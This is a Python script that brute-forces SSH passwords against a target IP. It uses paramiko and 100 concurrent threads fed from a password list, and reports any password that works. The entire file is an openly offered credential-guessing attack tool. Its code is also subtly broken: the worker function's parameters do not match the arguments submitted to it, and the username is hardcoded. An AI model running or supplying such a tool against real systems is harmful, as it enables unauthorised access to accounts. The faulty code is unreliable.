import paramiko
import os
from concurrent.futures import ThreadPoolExecutor
from threading import Event

stop_event = Event()

def attempt(ip, pwd):
    if stop_event.is_set():
        return

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, username='kali', password=pwd.strip(), timeout=3, allow_agent=False, look_for_keys=False)

    except paramiko.ssh_exception.AuthenticationException:
        pass

    except paramiko.ssh_exception.NoValidConnectionsError:
        print("Connection failed")

    except Exception:
        pass

    else:
        print(f"Password found: {pwd.strip()}")
        stop_event.set()

    finally:
        client.close()

def main():
    target_ip = input("Target IP: (default 192.168.1.1): ").strip() or "192.168.1.1"
    target_username = input("Target Username: (default kali): ").strip() or "kali"
    passwords_file = input("Passwords file path: (default 'ssh_passwords.txt'): ").strip() or "ssh_passwords.txt"

    if not os.path.exists(passwords_file):
        print(f"[!] Error: File '{passwords_file}' not found. Please check the path")
        return

    with open(rf'{passwords_file}', 'r') as passwords:
        with ThreadPoolExecutor(max_workers=100) as ex:
            for pwd in passwords:
                if stop_event.is_set():
                    break

                ex.submit(attempt, target_ip, target_username, pwd)

if __name__ == "__main__":
    main()
